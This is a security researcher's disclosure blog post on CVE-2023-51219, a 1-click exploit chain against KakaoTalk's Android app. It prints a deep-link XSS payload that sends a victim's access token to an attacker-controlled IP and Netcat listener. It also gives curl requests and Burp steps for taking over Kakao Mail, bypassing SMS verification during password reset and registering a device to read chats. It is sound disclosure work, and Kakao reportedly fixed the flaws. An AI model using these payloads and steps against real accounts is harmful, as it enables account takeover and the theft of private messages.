---
title: "1-click Exploit in South Korea's biggest mobile chat app"
date: 2024-05-31T14:04:20+02:00
lastmod: 2024-06-23T14:04:20+02:00
author: "stulle123"
summary: "Stealing another KakaoTalk user's chat messages with a simple 1-click exploit."
tags: 
- Android
- XSS
showToc: true
TocOpen: true
draft: false
disableShare: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
UseHugoToc: true
---

In this blog post we show how multiple low-hanging fruit vulnerabilities in KakaoTalk's Android app can lead to the disclosure of users' messages. We will cover different topics ranging from Android AppSec to Web Security.

## TL;DR

First things first: [PoC||GTFO](#poc)

{{< rawhtml >}} 
<video width=100% controls>
    <source src="https://github.com/stulle123/kakaotalk_analysis/assets/14765446/7fd439c5-b96b-49d9-b8b5-cd9be2a51fe9" type="video/mp4">
</video>
{{< /rawhtml >}}

A deep link validation issue in KakaoTalk `10.4.3` allows a remote adversary to run arbitrary JavaScript in a WebView that leaks an access token in a HTTP request header. Ultimately, this token can be used to takeover another user's account and read her/his chat messages by registering an attacker-controlled device. This bug got assigned with [CVE-2023-51219](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-51219). We also release our [tooling](https://github.com/stulle123/kakaotalk_analysis) so that fellow security researchers can dig into KakaoTalk's broad attack surface to find more bugs.

## Context

With more than 100 million downloads from the Google Playstore, KakaoTalk is South Korea's most popular chat app. Similar to apps such as WeChat, KakaoTalk is an "all-in" app including everything into one app (payment, ride-hailing services, shopping, e-mail, etc.). End-to-end encrypted (E2EE) messaging is not enabled per default in KakaoTalk. Regular chatrooms, where Kakao Corp. can access messages in transit, is the preferred way for many users. KakaoTalk does have an opt-in E2EE feature called "Secure Chat" but it doesn't support features such as group messaging or voice calling.

## Entry Point: CommerceBuyActivity

The `CommerceBuyActivity` WebView is the main entry point and very interesting from an attacker's point of view:

- It's exported and can be started with a deep link (e.g., `adb shell am start kakaotalk://buy`)
- It has JavaScript enabled (`settings.setJavaScriptEnabled(true);`)
- It supports the `intent://` [scheme](https://www.mbsd.jp/Whitepaper/IntentScheme.pdf) to send data to other **non-exported** app components via JavaScript. For example, the URI `"intent:#Intent;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity;S.EXTRA_URL=https://foo.bar;end"` loads the website `https://foo.bar` in the `MyProfileSettingsActivity` WebView.
- There's no sanitization of `intent://` URIs (e.g., the `Component` or `Selector` is **not** set to `null`). So, potentially any app component can be accessed.

Additionally, it leaks an access token in the `Authorization` HTTP header. Here's a simple way to reproduce this behavior:

- Start a Netcat listener in a terminal window: `$ nc -l 5555`
- Run `$ adb shell am start kakaotalk://buy` to start the `CommerceBuyActivity` WebView
- Since `WebView.setWebContentsDebuggingEnabled(true);` you can use `chrome://inspect` in Chrome to debug it
- Go to the `Console` tab and enter `document.location="http://<your-IP-address>:5555/";`
- You should see a GET request and the `Authorization` header

This means that if we find a way to run our own JavaScript inside the `CommerceBuyActivity` we would have the ability to steal the user's access token and to start arbitrary app components when the user clicks on a malicious `kakaotalk://buy` deep link.

Unfortunately, we can't load arbitrary attacker-controlled URLs as there is some validation going on:

```java
public final String m17260P5(Uri uri) {
    // This string is "https://buy.kakao.com"
    String m36725d = C24983v.m36725d();

    if (uri != null) {
        if (!C46907a.m54284B(uri.toString(), new ArrayList(Arrays.asList(C47684e.f174778c0, "buy")))) {
            return null;
        }

        if (C43097e.m51424i(uri.getQueryParameter("refresh"), RTCStatsParser.Key.TRUE)) {
            this.f33349x = true;
        }

        if (("kakaotalk".equals(uri.getScheme()) || "alphatalk".equals(uri.getScheme())) && "buy".equals(uri.getHost())) {
            // URL path can be controlled by an attacker
            if (!TextUtils.isEmpty(uri.getPath())) {
                m36725d = String.format("%s%s", m36725d, uri.getPath());
            }

            // URL query parameters can be controlled by an attacker
            if (!TextUtils.isEmpty(uri.getQuery())) {
                m36725d = String.format("%s?%s", m36725d, uri.getQuery());
            }

            // URL fragment can be controlled by an attacker
            if (!TextUtils.isEmpty(uri.getFragment())) {
                return String.format("%s#%s", m36725d, uri.getFragment());
            }

            return m36725d;
        } else if (C14325o2.f55096k.matcher(uri.toString()).matches()) {
            String uri2 = uri.toString();

            if (uri2.startsWith("http://")) {
                return uri2.replace("http://", "https://");
            }

            return uri2;
        }
    }
    return m36725d;
}
```

If you take a look at the code you'll recognize that we control the path, query parameters and fragment of the URL. However, everything is prefixed with the String `m36725d` which is `https://buy.kakao.com` in our case. That means if a user clicks on the deep link `kakaotalk://buy/foo` the URL `https://buy.kakao.com/foo` gets loaded in the `CommerceBuyActivity` WebView.

Maybe there's an Open Redirect or XSS issue on `https://buy.kakao.com` so that we can run JavaScript? :thinking:

## URL Redirect to DOM XSS

While digging into `https://buy.kakao.com` we identified the endpoint `https://buy.kakao.com/auth/0/cleanFrontRedirect?returnUrl=` which allowed to redirect to any `kakao.com` domain. This vastly increased our chances to find a XSS flaw as there are many many subdomains under `kakao.com`.

To find a vulnerable website we just googled for `site:*.kakao.com inurl:search -site:developers.kakao.com -site:devtalk.kakao.com` and found `https://m.shoppinghow.kakao.com/m/search/q/yyqw6t29`. The string `yyqw6t29` looked like a [DOM Invader canary](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/settings/canary) to us, so we investigated further. 

Funnily enough, there was already a Stored XSS as `https://m.shoppinghow.kakao.com/m/search/q/alert(1)` popped up an alert box. Searching the DOM brought up the responsible Stored XSS payload `[해외]test "><svg/onload=alert(1);// Pullover Hoodie`. **Edit:** As of May 2024 this seems to be fixed.

Continuing to browse the DOM we discovered another [endpoint](https://m.shoppinghow.kakao.com/m/product/Y25001977964/q:foo) where the search query was passed to a `innerHTML` sink (see [DOM Invader notes](https://github.com/stulle123/kakaotalk_analysis/blob/main/doc/ACCOUNT_TAKEOVER.md#dom-xss)). Eventually, the PoC XSS payload turned out to be as simple as `"><img src=x onerror=alert(1);>`.

At this point we could run arbitrary JavaScript in the `CommerceBuyActivity` WebView when the user clicked on a deep link such as `kakaotalk://auth/0/cleanFrontRedirect?returnUrl=https://m.shoppinghow.kakao.com/m/product/Y25001977964/q:"><img src=x onerror=alert(1);>`.

As explained [above](#entry-point-commercebuyactivity), `CommerceBuyActivity` leaks the user's access token in the `Authorization` header.

What could we do with this token? Maybe take over a victim’s KakaoTalk account? :relieved:

{{< box info >}}
Btw, we could also start arbitrary non-exported app components since `CommerceBuyActivity` supports the `intent://` scheme.
{{< /box >}}

## Deep Link to Kakao Mail Account Takeover

As explained in the previous section, we can steal the user's access token by running arbitrary JS in the `CommerceBuyActivity` WebView. By crafting a malicious deep link, we could send the token to an attacker-controlled server:

```
kakaotalk://buy/auth/0/cleanFrontRedirect?returnUrl=https://m.shoppinghow.kakao.com/m/product/Q24620753380/q:"><img src=x onerror="document.location=atob('aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUv');">
```

Let's break it down:

- `kakaotalk://buy` fires up `CommerceBuyActivity`
- `/auth/0/cleanFrontRedirect?returnUrl=` "compiles" to `https://buy.kakao.com/auth/0/cleanFrontRedirect?returnUrl=` and redirects to any `kakao.com` domain
- `https://m.shoppinghow.kakao.com/m/product/Q24620753380/q:` had the XSS issue
- `"><img src=x onerror="document.location=atob('aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUv');">` is the XSS payload. We had to Base64 encode `http://192.168.178.20:5555/` to bypass some sanitization checks.

Now, in possession of the access token what could we do with it? Well, how about we use it to take over the victim's Kakao Mail account that was used for KakaoTalk registration!

{{< box info >}}
If the victim doesn't have a Kakao Mail account it's possible to create a new Kakao Mail account on her/his behalf. This is interesting because creating a new Kakao Mail account overwrites the user's previous registered email-address with no additional checks. Scroll to the end of this section to check out how to do that.
{{< /box >}}

First, we needed to check if the victim actually uses Kakao Mail:

```bash
curl -i -s -k -X $'GET' \
    -H $'Host: katalk.kakao.com' -H $'Accept-Language: en' -H $'User-Agent: KT/10.4.3 An/11 en' -H $'Authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e' -H $'A: android/9.5.0/en' -H $'C: a327a1ad-b417-499a-abf7-48da89076e7c' -H $'Accept-Encoding: json, deflate, br' -H $'Connection: close' \
    $'https://katalk.kakao.com/android/account/more_settings.json?os_version=30&model=SDK_GPHONE_ARM64&since=1693786891&lang=en&vc=2610380&email=2&adid=&adid_status=-1'
```

Next, we had to grab another access token to access Kakao Mail:

```bash
curl -i -s -k -X $'POST' \
    -H $'Host: api-account.kakao.com' -H $'Accept-Language: en' -H $'User-Agent: KT/10.4.3 An/11 en' -H $'Authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e' -H $'A: android/10.4.3/en' -H $'C: 2cc348d0-b7f7-464c-b72b-1e3f66a04362' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 174' -H $'Accept-Encoding: json, deflate, br' -H $'Connection: close' \
    --data-binary $'key_type=talk_session_info&key=64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e&referer=talk' \
    $'https://api-account.kakao.com/v1/auth/tgt'
```

This was an example response:

```json
{"code":0,"token":"5e09081b0cce35288422a0b6589ef860","expires":1700735745,"verifyToken":null}
```

With the newly gathered token we could access a victim's Kakao Mail account with Burp. Here's a way for you to reproduce it:

1. Launch Burp's browser: go to the `Proxy > Intercept` tab, click `Open browser` and clear the browser's cache.
2. Go to the `Repeater` tab and create a new `HTTP` request (click on the `+` button).
3. Paste in the following (adapt the `Ka-Tgt` header accordingly):
```
GET / HTTP/2
Host: talk.mail.kakao.com
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 11; sdk_gphone_arm64 Build/RSR1.210722.013.A6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36;KAKAOTALK 2610380
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Km-Viewer-Ver: 1
Kakaotalk-Agent: os=android;osver=30;appver=10.4.3;lang=en;dtype=1;idiom=phone;device=SDK_GPHONE_ARM64
Ka-Tgt: 5e09081b0cce35288422a0b6589ef860
X-Requested-With: com.kakao.talk
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```
4. Click on `Send` and confirm the target's details
5. Right-click in the request window, select `Request in browser > In original session` and copy the URL into Burp's browser.

If necessary, we could also create a new Kakao Mail account on the user's behalf. Just repeat the same steps with Burp using the following HTTP request (adapt the `Authorization` header):

```
GET /kakao_mail/main?continue=https://talk.mail.kakao.com HTTP/1.1
Host: auth.kakao.com
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 11; sdk_gphone_arm64 Build/RSR1.210722.013.A6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36;KAKAOTALK 2610430
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e
Http_a: android/10.4.3/en
X-Requested-With: com.kakao.talk
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```

When creating a new email address tick the box `Set As Primary Email`.

## KakaoTalk Password Reset with Burp

With access to the victim's Kakao Mail account, a password reset was the next logical step. The only additional information required were the victim's email address, nickname and phone number which we got with the same curl query that we used above:

```bash
curl -i -s -k -X $'GET' \
    -H $'Host: katalk.kakao.com' -H $'Accept-Language: en' -H $'User-Agent: KT/10.4.3 An/11 en' -H $'Authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e' -H $'A: android/9.5.0/en' -H $'C: a327a1ad-b417-499a-abf7-48da89076e7c' -H $'Accept-Encoding: json, deflate, br' -H $'Connection: close' \
    $'https://katalk.kakao.com/android/account/more_settings.json?os_version=30&model=SDK_GPHONE_ARM64&since=1693786891&lang=en&vc=2610380&email=2&adid=&adid_status=-1'
```

Changing the password via `https://accounts.kakao.com` turned out to be a bit complicated as we had to bypass 2FA via SMS. However, it was as simple as intercepting and modifying a couple of requests with Burp. This is how you can do it:

1. Using the Burp browser visit the [Reset Password](https://accounts.kakao.com/weblogin/find_password?lang=en&continue=%2Flogin%3Fcontinue%3Dhttps%253A%252F%252Faccounts.kakao.com%252Fweblogin%252Faccount%252Finfo) link.
2. Add the victim's email address on the next page (`Reset password for your Kakao Account`). Before clicking on `Next`, enable the `Intercept` feature in Burp.
3. In Burp, forward all requests until you see a POST request to `/kakao_accounts/check_verify_type_for_find_password.json`. Right-click and select `Do intercept > Response to this request`.
4. In the response change `verify_types` to `0` (this sends the verification code to the victim's email address and not to her/his phone):
```json
{
  "status": 0,
  "verify_types": [
    0
  ],
  "suspended": false,
  "dormant": false,
  "kakaotalk": false,
  "expired": false,
  "created_at": 1700754321,
  "two_step_verification": false,
  "is_fill_in_email": false,
  "account_type": 0,
  "display_id": null
}
```
5. Disable `Intercept` in Burp and go back to Burp's browser. Click on `Using email address`.
6. Enter the victim's nickname and email address on the next page and click the `Verify` button.
7. Open a new browser tab and paste the Burp Repeater URL to access the user's Kakao Mail account (as described in the [previous](#deep-link-to-kakao-mail-account-takeover) section). If the message `session expired` shows up, clear the browser's cache.
8. Grab the verification code from the email and enter it to proceed to the next page.
9. On the page `Additional user verification will proceed to protect your Kakao Account.`, enable `Intercept` in Burp again. Enter some values and click `Confirm`. Back in Burp when you see a POST request to `/kakao_accounts/check_phone_number.json`, adjust the `iso_code` and `phone_number` (without country code) parameters in the request body. Forward the request and disable the `Intercept` option again.
10. Finally, you can enter the new password.

## PoC

The goal of the PoC is to register [KakaoTalk for Windows/MacOS](https://www.kakaocorp.com/page/service/service/KakaoTalk?lang=en) or the open-source client [KiwiTalk](https://github.com/KiwiTalk/KiwiTalk) to a victim's account to read her/his **non-end-to-end** encrypted chat messages.

The steps for an attacker are as follows:

### Attacker prepares the malicious deep link

First, she/he stores the payload to a file, ...

```javascript
<script>
location.href = decodeURIComponent("kakaotalk%3A%2F%2Fbuy%2Fauth%2F0%2FcleanFrontRedirect%3FreturnUrl%3Dhttps%3A%2F%2Fm.shoppinghow.kakao.com%2Fm%2Fproduct%2FQ24620753380%2Fq%3A%22%3E%3Cimg%20src%3Dx%20onerror%3D%22document.location%3Datob%28%27aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUv%27%29%3B%22%3E");
</script>
```

... starts the HTTP server and ...

```bash
$ python3 -m http.server 8888
```

... opens a Netcat listener in another terminal window: `$ nc -l 5555`. Easy ;-)

### Victim clicks the link and leaks an access token to the attacker

Next, the attacker sends a URL (e.g., `http://192.168.178.20:8888/foo.html`) and waits until the victim clicks it. The access token should be then leaked in the Netcat listener:

```bash
GET /foo.html HTTP/1.1
Host: 192.168.178.20:5555
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 10; M2004J19C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.66 Mobile Safari/537.36;KAKAOTALK 2610420;KAKAOTALK 10.4.2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e
os_name: Android
kakao-buy-version: 1.0
os_version: 10.4.2
X-Requested-With: com.kakao.talk
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

### Attacker uses the access token to reset the victim's password

Next, the attacker can now reset her/his KakaoTalk password (see instructions [above](#kakaotalk-password-reset-with-burp)).

### Attacker registers her/his device the victim's KakaoTalk account

When logging into KakaoTalk for Windows/MacOS or KiwiTalk with the victim's credentials a second authentication factor is required. It's a simple 4-digit pin which is either displayed in the PC version and needs to be entered in the KakaoTalk mobile app or the other way around (i.e., pin is sent to mobile app and needs to be entered in PC app).

Unfortunately, the pin can't be brute-forced as there's some rate limiting going on at the endpoints `https://talk-pilsner.kakao.com/talk-public/account/passcodeLogin/authorize` and `https://katalk.kakao.com/win32/account/register_device.json` (blocked after 5 attempts).

Luckily, we can still use the gathered access token to post/get the pin number to/from the KakaoTalk backend:

```bash
curl -i -s -k -X $'POST' \
    -H $'Host: talk-pilsner.kakao.com' -H $'Authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e' -H $'Talk-Agent: android/10.4.3' -H $'Talk-Language: en' -H $'Content-Type: application/json; charset=UTF-8' -H $'Content-Length: 19' -H $'Accept-Encoding: gzip, deflate, br' -H $'User-Agent: okhttp/4.10.0' \
    --data-binary $'{\"passcode\":\"8825\"}' \
    $'https://talk-pilsner.kakao.com/talk-public/account/passcodeLogin/authorize'
```

Example response:

```json
{"device":{"name":"foo"},"status":0}
```

In case the pin is sent to the KakaoTalk mobile app use this curl query:

```bash
curl -i -s -k -X $'GET' \
    -H $'Host: katalk.kakao.com' -H $'Accept-Language: en' -H $'User-Agent: KT/10.4.3 An/11 en' -H $'Authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e' -H $'A: android/10.4.3/en' -H $'Accept-Encoding: json, deflate, br' -H $'Connection: close' \
    $'https://katalk.kakao.com/android/sub_device/settings/info.json'
```

Example response:

```json
{"status":0,"isVerified":true,"passcode":"8825"}
```

And we're in! Profit :partying_face: :partying_face: :partying_face:

{{< rawhtml >}} 
<video width=100% controls>
    <source src="https://github.com/stulle123/kakaotalk_analysis/assets/14765446/7fd439c5-b96b-49d9-b8b5-cd9be2a51fe9" type="video/mp4">
</video>
{{< /rawhtml >}}

## Takeaways

1) There are still popular chat apps that don't require a very complex exploit chain to steal users' messages.
2) If app developers make a couple of simple mistakes, Android's strong security model and message encryption won't help.
3) Asian chat apps are still underrepresented in the security research community. I hope this blog post will encourage fellow researchers to dig into those apps.

## Responsible Disclosure

We reported this vulnerability in December 2023 via [Kakao's Bug Bounty Program](https://bugbounty.kakao.com/). However, we didn't receive any reward as only Koreans are eligible to receive a bounty :exploding_head:

As an immediate fix, Kakao Corp. took down `https://buy.kakao.com` and removed the `/auth/0/cleanFrontRedirect?returnUrl=` redirect. The vulnerable `CommerceBuyActivity` was removed in later versions (see [correspondence](https://github.com/stulle123/kakaotalk_analysis/tree/main/report)).